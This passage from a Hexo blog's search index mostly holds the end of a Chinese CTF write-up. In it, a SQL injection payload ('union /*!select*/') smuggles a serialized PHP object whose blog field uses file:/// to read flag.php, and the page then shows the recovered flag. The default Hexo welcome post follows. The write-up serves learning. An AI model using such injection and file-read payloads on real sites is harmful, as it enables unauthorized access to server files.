class="hljs-name">th</span>&gt;</span><br>                blog<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$flag = &quot;flag&#123;ab61868d-16df-4976-93c7-8980c7fbc7be&#125;&quot;;</span><br><span class="hljs-meta">exit(0);</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;53&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;56&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">        &lt;/tr&gt;</span><br><span class="hljs-meta">    &lt;/table&gt;</span><br></code></pre></td></tr></table></figure><p>所以flag为:</p><p>flag{ab61868d-16df-4976-93c7-8980c7fbc7be}</p><p>16.如果网站过滤了load_file(“路径”):</p><p>第四个字段data所显示的位置为:the contents of his&#x2F;her blog</p><p>该字段为将存储于数据库中的如O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} 的内容取出，然后根据该data中blog的地址，访问出blog的内容，所以我们可以让它显示&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php的内容</p><p>假设它网页是对这个序列化的内容base-64加密然后访问，则我们也只需要让它访问序列化的data：</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}</p><p>payload:</p><p>-1 union&#x2F;*!select *&#x2F;1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”；}’:</p><p><strong>the contents of his&#x2F;her blog,没有显示内容，可能依然为非该字段的格式内容，所以查看网页源代码:</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>the contents of his/her blog<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;100%&#x27;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&#x27;10em&#x27;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxOTUxNDdkZi1iN2NhLTQ1NjAtYmVjYi1kOTg1OTI4NTBmYzh9IjsNCmV4aXQoMCk7DQo=&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个区域显示的内容为src所指向区域，所以点击src所指向的区域:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;195147df-b7ca-4560-becb-d98592850fc8&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>得到flag.php的内容</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/21/hello-world/"/>
    <url>/2023/08/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>First_blog</title>
    <link href="/2023/08/21/First-blog/"/>
    <url>/2023/08/21/First-blog/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
